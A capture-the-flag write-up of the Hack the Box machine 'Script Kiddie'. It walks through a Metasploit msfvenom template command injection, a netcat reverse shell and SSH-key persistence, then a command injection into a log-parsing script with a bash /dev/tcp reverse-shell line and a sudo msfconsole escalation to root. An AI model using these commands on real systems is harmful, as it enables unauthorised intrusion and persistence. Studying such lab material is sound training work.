+++
author = "Nick"
categories = ["hack the box", "Linux", "netcat", "ssh-keygen", "metasploit"]
date = 2021-06-05T15:00:00Z
description = ""
draft = false
thumbnail = "/images/2021/05/scriptkiddie.png"
slug = "hack-the-box-script-kiddie"
summary = "Welcome back everyone! Today we are going to do the Hack the Box machine Script Kiddie. This is a Linux machine rated as easy. Let's jump in!"
tags = ["hack the box", "Linux", "netcat", "ssh-keygen", "metasploit"]
title = "Hack the Box - Script Kiddie"
url = "/hack-the-box-script-kiddie"

+++


Welcome back everyone! Today we are going to do the Hack the Box machine Script Kiddie. This is a Linux machine rated as easy. Let's jump in!

As always, we kick of our scans with `nmap` - `nmap -sC -sV -p- -oA allscan 10.10.10.226`.

Here are our results:
```
Nmap scan report for 10.10.10.226
Host is up (0.049s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)5000/tcp  open     http    Werkzeug httpd 0.16.1 (Python 3.8.5)|_http-server-header: Werkzeug/0.16.1 Python/3.8.5|_http-title: k1d'5 h4ck3r t00l559012/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There isn't much to go with. We see a webserver on port 5000 and that's about it. Let's take a look.

![](/images/2021/04/image.png)

We see a basic hacking tool interface. We can scan an IP address or create payloads. We have the ability to upload a payload template as well. We test out the page and sure enough it does generate some payloads. Some googling around leads us [here](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md). A MSF Venom template CVE and PoC.

We can find this template in `Metasploit`. If we search for `template` in `MSF` we see the module:

![](/images/2021/04/image-1.png)

We list out our `options`. We have pretty much the basics, an `lport` and `lhost`.

![](/images/2021/04/image-2.png)

We'll add our IP and port and generate the payload.

![](/images/2021/04/image-4.png)

We can even do the following to spin up an automatic payload handler within `MSF` if we want. I often do this, but in this case, we'll use `netcat`.

Command:
`msf6> set DisablePayloadHandler false`

Running the exploit shows us the path the file is saved. We'll copy out the payload and upload it to our web interface we found before. We also need to have a listener running.

Command:
`nc -lvnp 4444`

We can then set our localhost on the website to 127.0.0.1 and the platform to android.

![](/images/2021/05/image.png)

Once we hit generate, we should catch a connection back.

![](/images/2021/05/image-1.png)

Now we want to upgrade this shell. First, we check for `Python` and `Python3`.

Commands:
`which python`
`which python3`

![](/images/2021/05/image-2.png)

We see `Python3` installed so we'll [upgrade our shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) with that.

Command:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Now with a better shell connection, we can look around. This account does contant the `user.txt` flag, awesome! Now we can start enumerating for the `root.txt` flag. 

Next we want to find a better way tro stay connected. We can append our `ssh key` to the `authorized_keys` file for this user. First we'll want to make a new key with `ssh-keygen`.

Command:
`ssh-keygen`

We can copy the `id_rsa.pub` content into the `authorized_keys` file. Now we can just `ssh` into the box.

Command:
`ssh -i id_rsa kid@10.10.10.226`

Now that w're in, we don't even have to load `linenum.sh` or any other enumeration tools. We are able to manually access the `pwn` user account and freely look around to start.

Inside the `pwn` user account, we see a file called `scanlosers.sh` with the following code:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Can you spot the problem with this script? That's right, we can command injection into this. After some trial and error we find a command we can append the the `hackers` file to get a shell back.

Command:
`echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.116/1234 0>&1' #" >> hackers`

We quickly see the shell returned as `pwn`.

![](/images/2021/05/image-3.png)

However, `pwn` cannot access `root.txt`. So we need to look around some more. Basic enumeration shows us that we can run `msfconsole` as root.

![](/images/2021/05/image-4.png)

Awesome, let's do that. When the console loads, we get a bunch of ioctl errors but when we check our ID, we are running as `root`.

![](/images/2021/05/image-5.png)

Now we can simply cat the `root.txt` flag!

![](/images/2021/05/image-6.png)

A nice easy box with some required research and trial / error.

If you found this write-up useful, send some respect my way:
https://app.hackthebox.eu/profile/95635



